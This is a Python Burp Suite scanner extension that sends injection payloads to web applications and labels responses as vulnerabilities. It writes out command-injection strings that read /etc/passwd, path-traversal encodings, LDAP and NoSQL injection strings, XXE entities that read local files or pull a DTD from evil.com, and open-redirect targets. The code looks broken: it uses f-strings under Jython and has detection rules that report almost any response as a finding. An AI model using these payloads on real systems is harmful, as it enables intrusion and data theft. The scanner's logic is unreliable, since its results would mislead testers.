#!/usr/bin/env python3
"""
Comprehensive Security BCheck for Burp Suite
Combines multiple vulnerability detection techniques for comprehensive security testing
"""

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from java.net import URL
import re
import time
import base64

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("Comprehensive Security BCheck")
        
        # Register scanner check
        callbacks.registerScannerCheck(ComprehensiveSecurityCheck(callbacks, self._helpers))

class ComprehensiveSecurityCheck(IScannerCheck):
    def __init__(self, callbacks, helpers):
        self._callbacks = callbacks
        self._helpers = helpers
        self._issue_name = "Comprehensive Security Vulnerability"
        
        # Comprehensive payload collection
        self.security_payloads = {
            'command_injection': [
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "&& ls -la",
                "|| ls -la",
                "`ls -la`",
                "$(ls -la)",
                "| whoami",
                "& whoami",
                "; whoami",
                "| id",
                "& id",
                "; id",
                "| cat /etc/passwd",
                "& cat /etc/passwd",
                "; cat /etc/passwd"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
                "..%255c..%255c..%255cetc%255cpasswd",
                "..%5c..%5c..%5cetc%5cpasswd",
                "..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd"
            ],
            'nosql_injection': [
                "' || '1'=='1",
                "' || 1==1",
                "' || 1==1//",
                "' || 1==1/*",
                "' || 1==1#",
                "' || 1==1%00",
                "' || 1==1%0a",
                "' || 1==1%0d",
                "' || 1==1%0d%0a",
                "' || 1==1%0a%0d"
            ],
            'xxe_injection': [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\" >]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\" >]><foo>&xxe;</foo>"
            ],
            'template_injection': [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}",
                "{{7*'7'}}"
            ],
            'ldap_injection': [
                "*",
                "*)(uid=*))(|(uid=*",
                "*)(|(objectclass=*",
                "*)(|(objectclass=*))",
                "*)(|(objectclass=*))(|(objectclass=*",
                "*)(|(objectclass=*))(|(objectclass=*))",
                "*)(|(objectclass=*))(|(objectclass=*))(|(objectclass=*",
                "*)(|(objectclass=*))(|(objectclass=*))(|(objectclass=*))"
            ],
            'open_redirect': [
                "https://evil.com",
                "//evil.com",
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')",
                "file:///etc/passwd",
                "ftp://evil.com",
                "gopher://evil.com",
                "dict://evil.com",
                "ldap://evil.com"
            ],
            'rate_limiting_bypass': [
                "X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-For: 127.0.0.2",
                "X-Forwarded-For: 127.0.0.3",
                "X-Forwarded-For: 127.0.0.4",
                "X-Forwarded-For: 127.0.0.5",
                "X-Real-IP: 127.0.0.1",
                "X-Real-IP: 127.0.0.2",
                "X-Real-IP: 127.0.0.3",
                "X-Real-IP: 127.0.0.4",
                "X-Real-IP: 127.0.0.5"
            ]
        }
        
        # Security detection patterns
        self.security_patterns = [
            r"root:",
            r"admin:",
            r"password:",
            r"secret:",
            r"key:",
            r"token:",
            r"api_key",
            r"access_key",
            r"private_key",
            r"ssh_key",
            r"database",
            r"config",
            r"\.env",
            r"\.git",
            r"\.svn",
            r"\.htaccess",
            r"\.htpasswd",
            r"wp-config",
            r"config\.php",
            r"database\.yml"
        ]
        
        # Compile regex patterns
        self.security_regex = [re.compile(pattern, re.IGNORECASE) for pattern in self.security_patterns]

    def doPassiveScan(self, baseRequestResponse):
        """Passive scanning for security indicators"""
        issues = []
        
        # Check request and response for security patterns
        request = baseRequestResponse.getRequest()
        response = baseRequestResponse.getResponse()
        request_str = self._helpers.bytesToString(request)
        response_str = self._helpers.bytesToString(response)
        
        # Check request for sensitive patterns
        for pattern in self.security_regex:
            if pattern.search(request_str):
                issues.append(self._create_issue(
                    baseRequestResponse,
                    "Sensitive Information in Request",
                    f"Sensitive pattern detected in request: {pattern.pattern}",
                    "Medium"
                ))
                break
        
        # Check response for sensitive information
        sensitive_response_patterns = [
            r"error.*sql",
            r"mysql.*error",
            r"postgresql.*error",
            r"oracle.*error",
            r"sql.*syntax",
            r"stack trace",
            r"debug.*info",
            r"internal.*error",
            r"exception.*details",
            r"error.*details"
        ]
        
        for pattern in sensitive_response_patterns:
            if re.search(pattern, response_str, re.IGNORECASE):
                issues.append(self._create_issue(
                    baseRequestResponse,
                    "Information Disclosure",
                    f"Error information disclosed in response: {pattern}",
                    "Medium"
                ))
                break
        
        return issues

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Active scanning for security vulnerabilities"""
        issues = []
        
        # Test different security techniques
        for technique, payloads in self.security_payloads.items():
            for payload in payloads:
                # Create test request
                checkRequest = self._create_test_request(baseRequestResponse, insertionPoint, payload)
                
                # Send request and get response
                checkResponse = self._callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest
                )
                
                if checkResponse is None:
                    continue
                
                # Analyze response for security indicators
                if self._detect_security_vulnerability(checkResponse, technique, payload):
                    issues.append(self._create_issue(
                        checkResponse,
                        f"Security Vulnerability - {technique.replace('_', ' ').title()}",
                        f"Security vulnerability detected using {technique} technique with payload: {payload}",
                        "High"
                    ))
                    break  # Found vulnerability, move to next technique
        
        return issues

    def _create_test_request(self, baseRequestResponse, insertionPoint, payload):
        """Create a test request with the security payload"""
        # Get the base request
        request = baseRequestResponse.getRequest()
        
        # Insert the payload
        checkRequest = insertionPoint.buildRequest(payload)
        
        return checkRequest

    def _detect_security_vulnerability(self, response, technique, payload):
        """Detect security vulnerabilities based on response analysis"""
        if response is None:
            return False
        
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Check for specific technique indicators
        if technique == 'command_injection':
            return self._detect_command_injection(response, payload)
        elif technique == 'path_traversal':
            return self._detect_path_traversal(response, payload)
        elif technique == 'nosql_injection':
            return self._detect_nosql_injection(response, payload)
        elif technique == 'xxe_injection':
            return self._detect_xxe_injection(response, payload)
        elif technique == 'template_injection':
            return self._detect_template_injection(response, payload)
        elif technique == 'ldap_injection':
            return self._detect_ldap_injection(response, payload)
        elif technique == 'open_redirect':
            return self._detect_open_redirect(response, payload)
        elif technique == 'rate_limiting_bypass':
            return self._detect_rate_limiting_bypass(response, payload)
        
        return False

    def _detect_command_injection(self, response, payload):
        """Detect command injection"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for command injection indicators
        cmd_indicators = [
            'root:',
            'bin:',
            'daemon:',
            'sys:',
            'adm:',
            'uid=',
            'gid=',
            'groups=',
            'total ',
            'drwx',
            '-rwx',
            'ls:',
            'whoami',
            'id:'
        ]
        
        if any(indicator in response_str for indicator in cmd_indicators):
            return True
        
        return False

    def _detect_path_traversal(self, response, payload):
        """Detect path traversal"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for path traversal indicators
        path_indicators = [
            'root:',
            'bin:',
            'daemon:',
            'sys:',
            'adm:',
            'uid=',
            'gid=',
            'groups=',
            'total ',
            'drwx',
            '-rwx',
            'ls:',
            'whoami',
            'id:'
        ]
        
        if any(indicator in response_str for indicator in path_indicators):
            return True
        
        return False

    def _detect_nosql_injection(self, response, payload):
        """Detect NoSQL injection"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for NoSQL injection indicators
        nosql_indicators = [
            'mongo',
            'mongodb',
            'nosql',
            'document',
            'collection',
            'bson',
            'objectid',
            'aggregate',
            'find',
            'update',
            'delete',
            'insert'
        ]
        
        if any(indicator in response_str.lower() for indicator in nosql_indicators):
            return True
        
        return False

    def _detect_xxe_injection(self, response, payload):
        """Detect XXE injection"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for XXE injection indicators
        xxe_indicators = [
            'root:',
            'bin:',
            'daemon:',
            'sys:',
            'adm:',
            'uid=',
            'gid=',
            'groups=',
            'total ',
            'drwx',
            '-rwx',
            'ls:',
            'whoami',
            'id:'
        ]
        
        if any(indicator in response_str for indicator in xxe_indicators):
            return True
        
        return False

    def _detect_template_injection(self, response, payload):
        """Detect template injection"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for template injection indicators
        template_indicators = [
            '49',
            '7*7',
            '7*\'7\'',
            '7*"7"',
            '7*`7`',
            '7*{7}',
            '7*[7]',
            '7*(7)',
            '7*<7>',
            '7*&7'
        ]
        
        if any(indicator in response_str for indicator in template_indicators):
            return True
        
        return False

    def _detect_ldap_injection(self, response, payload):
        """Detect LDAP injection"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for LDAP injection indicators
        ldap_indicators = [
            'ldap',
            'ldapsearch',
            'cn=',
            'ou=',
            'dc=',
            'objectclass',
            'uid=',
            'gid=',
            'member=',
            'dn='
        ]
        
        if any(indicator in response_str.lower() for indicator in ldap_indicators):
            return True
        
        return False

    def _detect_open_redirect(self, response, payload):
        """Detect open redirect"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for open redirect indicators
        redirect_indicators = [
            'location:',
            'redirect:',
            'refresh:',
            'url=',
            'target=',
            'next=',
            'return=',
            'redir=',
            'destination=',
            'goto='
        ]
        
        if any(indicator in response_str.lower() for indicator in redirect_indicators):
            return True
        
        return False

    def _detect_rate_limiting_bypass(self, response, payload):
        """Detect rate limiting bypass"""
        response_str = self._helpers.bytesToString(response.getResponse())
        
        # Look for rate limiting bypass indicators
        rate_limit_indicators = [
            'rate limit',
            'too many requests',
            'throttled',
            'quota exceeded',
            'limit exceeded',
            'try again later',
            'slow down',
            'rate exceeded'
        ]
        
        # If we get a different response than rate limiting, it might indicate bypass
        if not any(indicator in response_str.lower() for indicator in rate_limit_indicators):
            return True
        
        return False

    def _create_issue(self, requestResponse, name, detail, severity):
        """Create a scan issue"""
        return CustomScanIssue(
            requestResponse.getHttpService(),
            self._helpers.analyzeRequest(requestResponse).getUrl(),
            [requestResponse],
            name,
            detail,
            severity
        )

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        if self._severity == "High":
            return "High"
        elif self._severity == "Medium":
            return "Medium"
        elif self._severity == "Low":
            return "Low"
        else:
            return "Information"

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return "Security vulnerabilities can lead to unauthorized access, data theft, system compromise, and other serious security breaches."

    def getRemediationBackground(self):
        return "Implement proper input validation, output encoding, access controls, and security headers. Use secure coding practices and regular security testing."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "1. Implement proper input validation and sanitization\n2. Use output encoding for all user-controlled data\n3. Implement proper access controls and authentication\n4. Use secure headers and security policies\n5. Regular security testing and code reviews\n6. Use web application firewalls (WAFs)\n7. Implement proper logging and monitoring\n8. Follow secure coding practices\n9. Keep software and dependencies updated\n10. Implement defense in depth"

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
